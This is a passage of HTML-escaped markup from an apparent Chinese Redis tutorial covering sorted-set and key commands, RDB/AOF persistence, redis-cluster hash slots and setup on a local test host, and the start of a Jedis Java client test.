class=&quot;hljs-number&quot;&gt;4&lt;/span&gt;) &lt;span class=&quot;hljs-string&quot;&gt;&quot;a&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;127.0.0.1:6379&amp;gt;&lt;/span&gt; zrange zset1 &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt; -&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt; withscores&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;) &lt;span class=&quot;hljs-string&quot;&gt;&quot;d&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;) &lt;span class=&quot;hljs-string&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;3&lt;/span&gt;) &lt;span class=&quot;hljs-string&quot;&gt;&quot;b&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;4&lt;/span&gt;) &lt;span class=&quot;hljs-string&quot;&gt;&quot;4&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;5&lt;/span&gt;) &lt;span class=&quot;hljs-string&quot;&gt;&quot;c&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;6&lt;/span&gt;) &lt;span class=&quot;hljs-string&quot;&gt;&quot;5&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;7&lt;/span&gt;) &lt;span class=&quot;hljs-string&quot;&gt;&quot;a&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;8&lt;/span&gt;) &lt;span class=&quot;hljs-string&quot;&gt;&quot;9&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;127.0.0.1:6379&amp;gt;&lt;/span&gt; zrevrange zset1 &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt; -&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;) &lt;span class=&quot;hljs-string&quot;&gt;&quot;a&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;) &lt;span class=&quot;hljs-string&quot;&gt;&quot;c&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;3&lt;/span&gt;) &lt;span class=&quot;hljs-string&quot;&gt;&quot;b&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;4&lt;/span&gt;) &lt;span class=&quot;hljs-string&quot;&gt;&quot;d&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;127.0.0.1:6379&amp;gt;&lt;/span&gt; zrevrange zset1 &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt; -&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt; withscores&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;) &lt;span class=&quot;hljs-string&quot;&gt;&quot;a&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;) &lt;span class=&quot;hljs-string&quot;&gt;&quot;9&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;3&lt;/span&gt;) &lt;span class=&quot;hljs-string&quot;&gt;&quot;c&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;4&lt;/span&gt;) &lt;span class=&quot;hljs-string&quot;&gt;&quot;5&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;5&lt;/span&gt;) &lt;span class=&quot;hljs-string&quot;&gt;&quot;b&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;6&lt;/span&gt;) &lt;span class=&quot;hljs-string&quot;&gt;&quot;4&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;7&lt;/span&gt;) &lt;span class=&quot;hljs-string&quot;&gt;&quot;d&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;8&lt;/span&gt;) &lt;span class=&quot;hljs-string&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;127.0.0.1:6379&amp;gt;&lt;/span&gt; &lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;h35key&quot;&gt;&lt;span&gt;&lt;strong&gt;3.5、key 命令&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;pre readability=&quot;6&quot;&gt;
&lt;code class=&quot;hljs vbnet&quot; readability=&quot;6&quot;&gt;expire &lt;span class=&quot;hljs-keyword&quot;&gt;key&lt;/span&gt; second   设置&lt;span class=&quot;hljs-keyword&quot;&gt;key&lt;/span&gt;的过期时间&lt;br/&gt;ttl &lt;span class=&quot;hljs-keyword&quot;&gt;key&lt;/span&gt;             查看剩余时间(&lt;span class=&quot;hljs-number&quot;&gt;-2&lt;/span&gt; 表示不存在，&lt;span class=&quot;hljs-number&quot;&gt;-1&lt;/span&gt; 表示已被持久化(永不过期)，正数表示剩余的时间)&lt;br/&gt;persist &lt;span class=&quot;hljs-keyword&quot;&gt;key&lt;/span&gt;         清除过期时间，也即持久化，持久化成功体提示 &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;，不成功提示 &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;&lt;br/&gt;del &lt;span class=&quot;hljs-keyword&quot;&gt;key&lt;/span&gt;             删除&lt;span class=&quot;hljs-keyword&quot;&gt;key&lt;/span&gt;  &lt;br/&gt;exists &lt;span class=&quot;hljs-keyword&quot;&gt;key&lt;/span&gt;          若&lt;span class=&quot;hljs-keyword&quot;&gt;key&lt;/span&gt;存在，返回&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;，否则返回&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;。&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;            表示选择&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;号数据库。默认是&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;号数据库。&lt;p&gt;redis 默认有&lt;span class=&quot;hljs-number&quot;&gt;16&lt;/span&gt;个库 &lt;span class=&quot;hljs-keyword&quot;&gt;select&lt;/span&gt; num 从&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;开始换库&lt;/p&gt;&lt;p&gt;keys *              获取redis里面所有的&lt;span class=&quot;hljs-keyword&quot;&gt;key&lt;/span&gt;&lt;br/&gt;dbsize              查看当前数据库的&lt;span class=&quot;hljs-keyword&quot;&gt;key&lt;/span&gt;的数量&lt;br/&gt;flushdb             清空当前库的所有&lt;span class=&quot;hljs-keyword&quot;&gt;key&lt;/span&gt;&lt;br/&gt;flushall            清空所有库的&lt;span class=&quot;hljs-keyword&quot;&gt;key&lt;/span&gt;&lt;br/&gt;exists &lt;span class=&quot;hljs-keyword&quot;&gt;key&lt;/span&gt;          是否存在该&lt;span class=&quot;hljs-keyword&quot;&gt;key&lt;/span&gt;&lt;br/&gt;move &lt;span class=&quot;hljs-keyword&quot;&gt;key&lt;/span&gt; db         把当前库的&lt;span class=&quot;hljs-keyword&quot;&gt;key&lt;/span&gt;移到db号库中&lt;br/&gt;type &lt;span class=&quot;hljs-keyword&quot;&gt;key&lt;/span&gt;            查看&lt;span class=&quot;hljs-keyword&quot;&gt;key&lt;/span&gt;的类型&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;h36redis&quot;&gt;&lt;span&gt;&lt;strong&gt;3.6、redis持久化方案&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;redis 数据都放在内存中&lt;/code&gt;。如果机器挂掉，内存的数据就不存在。&lt;br/&gt;需要做&lt;code&gt;持久化处理&lt;/code&gt;，将内存中的数据保存在磁盘，下一次启动的时候就可以恢复数据到内存中。&lt;br/&gt;  方案1：RDB 快照形式（定期将当前时刻的数据保存磁盘中）会产生一个dump.rdb文件。&lt;br/&gt;    特点：会存在数据丢失，性能较好，数据备份。&lt;br/&gt;  方案2：AOF:append only file （所有对redis的操作命令记录在aof文件中），恢复数据，重新执行一遍即可。&lt;br/&gt;    特点：每秒保存（也可能会存在数据丢失），数据比较完整，耗费性能。其实也可以设置成每次保存，但是此就失去了缓存的意义了。&lt;br/&gt;&lt;code&gt;redis默认开启RDB。&lt;/code&gt;如下图：&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2018/11/19/5zS4bH.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;redis.conf 中默认设置了保存规则及时间间隔。
&lt;pre&gt;
&lt;code class=&quot;hljs nginx&quot;&gt;&lt;span class=&quot;hljs-attribute&quot;&gt;save&lt;/span&gt; 开头的一行就是持久化配置，可以配置多个条件（每行配置一个条件），每个条件之间是“或”的关系。&lt;br/&gt;save &lt;span class=&quot;hljs-number&quot;&gt;900&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;      表示&lt;span class=&quot;hljs-number&quot;&gt;15&lt;/span&gt;分钟（&lt;span class=&quot;hljs-number&quot;&gt;900&lt;/span&gt;秒）内至少&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;个键被更改则进行快照。&lt;br/&gt;save &lt;span class=&quot;hljs-number&quot;&gt;300&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;10&lt;/span&gt;     表示&lt;span class=&quot;hljs-number&quot;&gt;5&lt;/span&gt;分钟（&lt;span class=&quot;hljs-number&quot;&gt;300&lt;/span&gt;秒）内至少&lt;span class=&quot;hljs-number&quot;&gt;10&lt;/span&gt;个键被更改则进行快照。&lt;br/&gt;save &lt;span class=&quot;hljs-number&quot;&gt;60&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;10000&lt;/span&gt;   表示&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;分钟（&lt;span class=&quot;hljs-number&quot;&gt;60&lt;/span&gt;秒）内至少&lt;span class=&quot;hljs-number&quot;&gt;10000&lt;/span&gt;个键被更改则进行快照。&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;AOF开启设置，修改 redis.conf 文件，如下图：&lt;br/&gt;将appendonly设置为yes即可。&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2018/11/19/5zSZnu.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;同时开启两个持久化方案，则按照&lt;code&gt;AOF的持久化放案恢复数据&lt;/code&gt;。&lt;br/&gt;默认是按照RDB的方式恢复数据，如果开启了AOF，就是用AOF恢复数据，数据是存在于/usr/local/redis/bin/appendonly.aof文件中。
&lt;h2 id=&quot;h4redis&quot;&gt;&lt;span&gt;&lt;strong&gt;4、Redis集群的搭建&lt;/strong&gt;&lt;/span&gt;&lt;/h2&gt;
&lt;h3 id=&quot;h41rediscluster&quot;&gt;&lt;span&gt;&lt;strong&gt;4.1、redis-cluster架构图&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2018/11/19/5zSPiO.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;架构细节详解如下：
&lt;pre readability=&quot;5.5&quot;&gt;
&lt;code class=&quot;hljs javascript&quot; readability=&quot;5&quot;&gt;架构细节:&lt;br/&gt;(&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;) 所有的 redis 节点彼此互联(&lt;span class=&quot;hljs-string&quot;&gt;`PING-PONG机制`&lt;/span&gt;)，内部使用&lt;span class=&quot;hljs-string&quot;&gt;`二进制协议`&lt;/span&gt;优化传输速度和带宽。&lt;br/&gt;(&lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;) 节点的 fail(失败) 是通过集群中&lt;span class=&quot;hljs-string&quot;&gt;`超过半数的节点检测失效`&lt;/span&gt;时才生效。即&lt;span class=&quot;hljs-string&quot;&gt;`集群搭建中主机的个数为奇数`&lt;/span&gt;。&lt;br/&gt;(&lt;span class=&quot;hljs-number&quot;&gt;3&lt;/span&gt;) 客户端与 redis 节点直连，不需要中间 proxy层，客户端不需要连接集群所有节点，连接集群中任何一个可用节点即可。&lt;br/&gt;(&lt;span class=&quot;hljs-number&quot;&gt;4&lt;/span&gt;) redis-cluster 把所有的物理节点映射到 [&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;hljs-number&quot;&gt;-16383&lt;/span&gt;]slot(槽) 上，cluster 负责维护 node&amp;lt;--&amp;gt;slot&amp;lt;--&amp;gt;value&lt;p&gt;Redis 集群中内置了 &lt;span class=&quot;hljs-string&quot;&gt;`16384 个哈希槽`&lt;/span&gt;，当需要在 Redis 集群中放置一个 key-value 时，redis 先对 key 使用 crc16 算法算出一个结果，然后把结果&lt;span class=&quot;hljs-string&quot;&gt;`对 16384 求余数`&lt;/span&gt;，这样每个 key 都会对应一个编号在 &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;hljs-number&quot;&gt;-16383&lt;/span&gt; 之间的哈希槽，redis 会根据节点数量&lt;span class=&quot;hljs-string&quot;&gt;`大致均等`&lt;/span&gt;的将哈希槽映射到不同的节点。如下图所示：&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;哈希槽的图解：&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2018/11/19/5zSycA.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;redis-cluster投票，容错机制图解：&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2018/11/19/5zScXq.png&quot; alt=&quot;&quot;/&gt;&lt;h3 id=&quot;h42redis&quot;&gt;&lt;span&gt;&lt;strong&gt;4.2、redis集群的搭建&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;因为有&lt;code&gt;投票容错机制&lt;/code&gt;，所以需要至少3个节点(奇数)，为了集群的&lt;code&gt;高可用&lt;/code&gt;，为每一个节点增加一个&lt;code&gt;备份机&lt;/code&gt;（共6台服务器）。&lt;br/&gt;搭建&lt;code&gt;伪分布式集群&lt;/code&gt;方案：在一台机器里面运行6个redis实例。端口需要不同即可（7001-7006）。&lt;/p&gt;
&lt;h4 id=&quot;h421&quot;&gt;&lt;span&gt;&lt;strong&gt;4.2.1、集群搭建环境&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;h4 id=&quot;h422&quot;&gt;&lt;span&gt;&lt;strong&gt;4.2.2、搭建步骤&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;参考文章链接：&lt;a href=&quot;https://www.cnblogs.com/chenmingjun/p/9903889.html&quot; target=&quot;_blank&quot;&gt;https://www.cnblogs.com/chenmingjun/p/9903889.html&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;h43&quot;&gt;&lt;span&gt;&lt;strong&gt;4.3、集群的使用方法&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;redis-cli连接集群。连接主节点或者从节点都可以。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs ruby&quot;&gt;[root@itheima redis-cluster]&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;192.168.25.153:7006&amp;gt;&lt;/span&gt; set key1 &lt;span class=&quot;hljs-number&quot;&gt;123&lt;/span&gt;&lt;br/&gt;-&amp;gt; Redirected to slot [&lt;span class=&quot;hljs-number&quot;&gt;9189&lt;/span&gt;] located at &lt;span class=&quot;hljs-number&quot;&gt;192.168&lt;/span&gt;.&lt;span class=&quot;hljs-number&quot;&gt;25.153&lt;/span&gt;&lt;span class=&quot;hljs-symbol&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;hljs-number&quot;&gt;7002&lt;/span&gt;&lt;br/&gt;OK&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;192.168.25.153:7002&amp;gt;&lt;/span&gt; keys *&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;) &lt;span class=&quot;hljs-string&quot;&gt;&quot;key1&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;192.168.25.153:7002&amp;gt;&lt;/span&gt; set key2 abc&lt;br/&gt;-&amp;gt; Redirected to slot [&lt;span class=&quot;hljs-number&quot;&gt;4998&lt;/span&gt;] located at &lt;span class=&quot;hljs-number&quot;&gt;192.168&lt;/span&gt;.&lt;span class=&quot;hljs-number&quot;&gt;25.153&lt;/span&gt;&lt;span class=&quot;hljs-symbol&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;hljs-number&quot;&gt;7001&lt;/span&gt;&lt;br/&gt;OK&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;192.168.25.153:7001&amp;gt;&lt;/span&gt; keys *&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;) &lt;span class=&quot;hljs-string&quot;&gt;&quot;key2&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;192.168.25.153:7001&amp;gt;&lt;/span&gt; set key3 bbbb&lt;br/&gt;OK&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;192.168.25.153:7001&amp;gt;&lt;/span&gt; set key4 cccc&lt;br/&gt;-&amp;gt; Redirected to slot [&lt;span class=&quot;hljs-number&quot;&gt;13120&lt;/span&gt;] located at &lt;span class=&quot;hljs-number&quot;&gt;192.168&lt;/span&gt;.&lt;span class=&quot;hljs-number&quot;&gt;25.153&lt;/span&gt;&lt;span class=&quot;hljs-symbol&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;hljs-number&quot;&gt;7003&lt;/span&gt;&lt;br/&gt;OK&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;192.168.25.153:7003&amp;gt;&lt;/span&gt; &lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;-c：代表连接的是redis集群&lt;br/&gt;使用命令操作redis集群是和单机版的redids是一样的。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs css&quot;&gt;192&lt;span class=&quot;hljs-selector-class&quot;&gt;.168&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.25&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.153&lt;/span&gt;&lt;span class=&quot;hljs-selector-pseudo&quot;&gt;:7003&lt;/span&gt;&amp;gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;cluster&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;info&lt;/span&gt;   #查询集群的信息&lt;br/&gt;&lt;span class=&quot;hljs-selector-tag&quot;&gt;cluster_state&lt;/span&gt;&lt;span class=&quot;hljs-selector-pseudo&quot;&gt;:ok&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-selector-tag&quot;&gt;cluster_slots_assigned&lt;/span&gt;&lt;span class=&quot;hljs-selector-pseudo&quot;&gt;:16384&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-selector-tag&quot;&gt;cluster_slots_ok&lt;/span&gt;&lt;span class=&quot;hljs-selector-pseudo&quot;&gt;:16384&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-selector-tag&quot;&gt;cluster_slots_pfail&lt;/span&gt;&lt;span class=&quot;hljs-selector-pseudo&quot;&gt;:0&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-selector-tag&quot;&gt;cluster_slots_fail&lt;/span&gt;&lt;span class=&quot;hljs-selector-pseudo&quot;&gt;:0&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-selector-tag&quot;&gt;cluster_known_nodes&lt;/span&gt;&lt;span class=&quot;hljs-selector-pseudo&quot;&gt;:6&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-selector-tag&quot;&gt;cluster_size&lt;/span&gt;&lt;span class=&quot;hljs-selector-pseudo&quot;&gt;:3&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-selector-tag&quot;&gt;cluster_current_epoch&lt;/span&gt;&lt;span class=&quot;hljs-selector-pseudo&quot;&gt;:6&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-selector-tag&quot;&gt;cluster_my_epoch&lt;/span&gt;&lt;span class=&quot;hljs-selector-pseudo&quot;&gt;:3&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-selector-tag&quot;&gt;cluster_stats_messages_sent&lt;/span&gt;&lt;span class=&quot;hljs-selector-pseudo&quot;&gt;:1623&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-selector-tag&quot;&gt;cluster_stats_messages_received&lt;/span&gt;&lt;span class=&quot;hljs-selector-pseudo&quot;&gt;:1623&lt;/span&gt;&lt;br/&gt;192&lt;span class=&quot;hljs-selector-class&quot;&gt;.168&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.25&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.153&lt;/span&gt;&lt;span class=&quot;hljs-selector-pseudo&quot;&gt;:7003&lt;/span&gt;&amp;gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;cluster&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;nodes&lt;/span&gt;  #查询集群的节点&lt;br/&gt;&lt;span class=&quot;hljs-selector-tag&quot;&gt;ecb5aafd409740004ac3bf298318e2243f562e4e&lt;/span&gt; 192&lt;span class=&quot;hljs-selector-class&quot;&gt;.168&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.25&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.153&lt;/span&gt;&lt;span class=&quot;hljs-selector-pseudo&quot;&gt;:7004&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;slave&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;b207611daffa174990c64499495fc42ce3978767&lt;/span&gt; 0 1542619629901 4 &lt;span class=&quot;hljs-selector-tag&quot;&gt;connected&lt;/span&gt;&lt;br/&gt;30775&lt;span class=&quot;hljs-selector-tag&quot;&gt;ef3b509604b604b76a4407334fe1fb6304f&lt;/span&gt; 192&lt;span class=&quot;hljs-selector-class&quot;&gt;.168&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.25&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.153&lt;/span&gt;&lt;span class=&quot;hljs-selector-pseudo&quot;&gt;:7006&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;slave&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;c6514cdac6977ef8a8fbee8c7d5c3e4edd7df585&lt;/span&gt; 0 1542619634936 6 &lt;span class=&quot;hljs-selector-tag&quot;&gt;connected&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-selector-tag&quot;&gt;fd369b55daa7cdd8640e1e1bfa8fa2ab9cfe39cd&lt;/span&gt; 192&lt;span class=&quot;hljs-selector-class&quot;&gt;.168&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.25&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.153&lt;/span&gt;&lt;span class=&quot;hljs-selector-pseudo&quot;&gt;:7002&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;master&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;-&lt;/span&gt; 0 1542619633928 2 &lt;span class=&quot;hljs-selector-tag&quot;&gt;connected&lt;/span&gt; 5461&lt;span class=&quot;hljs-selector-tag&quot;&gt;-10922&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-selector-tag&quot;&gt;c6514cdac6977ef8a8fbee8c7d5c3e4edd7df585&lt;/span&gt; 192&lt;span class=&quot;hljs-selector-class&quot;&gt;.168&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.25&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.153&lt;/span&gt;&lt;span class=&quot;hljs-selector-pseudo&quot;&gt;:7003&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;myself&lt;/span&gt;,&lt;span class=&quot;hljs-selector-tag&quot;&gt;master&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;-&lt;/span&gt; 0 0 3 &lt;span class=&quot;hljs-selector-tag&quot;&gt;connected&lt;/span&gt; 10923&lt;span class=&quot;hljs-selector-tag&quot;&gt;-16383&lt;/span&gt;&lt;br/&gt;75&lt;span class=&quot;hljs-selector-tag&quot;&gt;a701f4cd545ee704ded294c17bbfa3f02eaee1&lt;/span&gt; 192&lt;span class=&quot;hljs-selector-class&quot;&gt;.168&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.25&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.153&lt;/span&gt;&lt;span class=&quot;hljs-selector-pseudo&quot;&gt;:7005&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;slave&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;fd369b55daa7cdd8640e1e1bfa8fa2ab9cfe39cd&lt;/span&gt; 0 1542619631916 5 &lt;span class=&quot;hljs-selector-tag&quot;&gt;connected&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-selector-tag&quot;&gt;b207611daffa174990c64499495fc42ce3978767&lt;/span&gt; 192&lt;span class=&quot;hljs-selector-class&quot;&gt;.168&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.25&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.153&lt;/span&gt;&lt;span class=&quot;hljs-selector-pseudo&quot;&gt;:7001&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;master&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;-&lt;/span&gt; 0 1542619632921 1 &lt;span class=&quot;hljs-selector-tag&quot;&gt;connected&lt;/span&gt; 0&lt;span class=&quot;hljs-selector-tag&quot;&gt;-5460&lt;/span&gt;&lt;br/&gt;192&lt;span class=&quot;hljs-selector-class&quot;&gt;.168&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.25&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.153&lt;/span&gt;&lt;span class=&quot;hljs-selector-pseudo&quot;&gt;:7003&lt;/span&gt;&amp;gt; &lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;h5javajedis&quot;&gt;&lt;span&gt;&lt;strong&gt;5、Java客户端Jedis的使用方法&lt;/strong&gt;&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;需要把jedis依赖的jar包添加到工程中。Maven工程中需要把jedis的坐标添加到依赖。&lt;br/&gt;&lt;code&gt;推荐添加到服务层&lt;/code&gt;。本例中是：taotao-content-service工程中。&lt;br/&gt;第一步：添加jar包的依赖&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2018/11/19/5zSvW9.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;在taotao-content-service中添加测试方法，测试如下：
&lt;h3 id=&quot;h51redis&quot;&gt;&lt;span&gt;&lt;strong&gt;5.1、通过单实例连接redis服务器单机版&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs cs&quot;&gt;    @&lt;span class=&quot;hljs-function&quot;&gt;Test&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;jedisClientTest&lt;/span&gt;() throws Exception &lt;/span&gt;{&lt;br/&gt;Jedis jedis = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; Jedis(&lt;span class=&quot;hljs-string&quot;&gt;&quot;192.168.25.153&quot;&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;6379&lt;/span&gt;);&lt;br/&gt;jedis.&lt;span class=&quot;hljs-keyword&quot;&gt;select&lt;/span&gt;(&lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;);&lt;br/&gt;jedis.&lt;span class=&quot;hljs-keyword&quot;&gt;set&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;&quot;s4&quot;&lt;/span&gt;, &lt;span class=&quot;hljs-string&quot;&gt;&quot;晓艺，你还好吗？&quot;&lt;/span&gt;);&lt;br/&gt;String result = jedis.&lt;span class=&quot;hljs-keyword&quot;&gt;get&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;&quot;s4&quot;&lt;/span&gt;);&lt;br/&gt;System.&lt;span 